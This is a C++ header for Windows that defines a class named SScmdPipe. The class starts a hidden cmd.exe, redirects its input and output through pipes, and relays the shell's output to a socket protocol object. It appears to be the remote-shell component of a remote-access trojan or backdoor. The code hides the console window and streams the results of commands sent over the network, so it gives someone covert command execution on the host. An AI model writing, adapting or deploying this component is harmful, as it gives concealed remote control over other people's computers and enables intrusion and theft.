#ifndef __H__CMD__PIPE__
#define __H__CMD__PIPE__
#include "SSprotocol.h"
#define PIPE_BUFF_SIZE (32 * 1024)

class SScmdPipe {
public:
	static void init(SSprotocol* sock){
		SScmdPipe::sock = sock;

	}

	static int sendMsg(char* command) {
		DWORD result = 0;
		WriteFile(hWriteFile, command, (int)strlen(command), &result, NULL);
		DWORD t;
		WriteFile(hWriteFile, "\n", 1, &t, NULL);
		return result;
	}

	static bool createCmd() {
		if (hReadThread != NULL)
			TerminateThread(hReadThread, 0x00000000);
		
		hReadThread = NULL;
		SECURITY_ATTRIBUTES pipeA, pipeB;

		pipeA.nLength = sizeof(SECURITY_ATTRIBUTES);
		pipeA.lpSecurityDescriptor = NULL;
		pipeA.bInheritHandle = true;
		if (!CreatePipe(&hReadPipe, &hWriteFile, &pipeA, 0))
			return false;

		pipeB.nLength = sizeof(SECURITY_ATTRIBUTES);
		pipeB.lpSecurityDescriptor = NULL;
		pipeB.bInheritHandle = true;
		if (!CreatePipe(&hReadFile, &hWritePipe, &pipeB, 0))
			return false;

		STARTUPINFO cmdpos;
		ZeroMemory(&cmdpos, sizeof(cmdpos));


		GetStartupInfo(&cmdpos);
		cmdpos.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		cmdpos.wShowWindow = SW_HIDE;
		cmdpos.hStdInput = hReadPipe;
		cmdpos.hStdOutput = hWritePipe;
		cmdpos.hStdError = hWritePipe;

		PROCESS_INFORMATION processInformation;

		char cmdPath[256];

		GetSystemDirectory(cmdPath, sizeof(cmdPath));
		strcat_s(cmdPath, "\\cmd.exe");
		CreateProcess(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &cmdpos, &processInformation);
		typedef void* (*FUNC)(void*);
		hReadThread = CreateThread(NULL, NULL, SScmdPipe::ReadPipeThread, NULL, NULL, NULL);
		return true;
	}

private:
	static SSprotocol* sock;
	static HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;
	static char send_buff[PIPE_BUFF_SIZE];
	static HANDLE hReadThread;

	static DWORD WINAPI ReadPipeThread(LPVOID param) {
		DWORD len;
		while (true) {
			memset(send_buff, 0, PIPE_BUFF_SIZE);
			ReadFile(hReadFile, send_buff, PIPE_BUFF_SIZE, &len, NULL);
			sock->_feedBack(send_buff);
		}
	}
};



#endif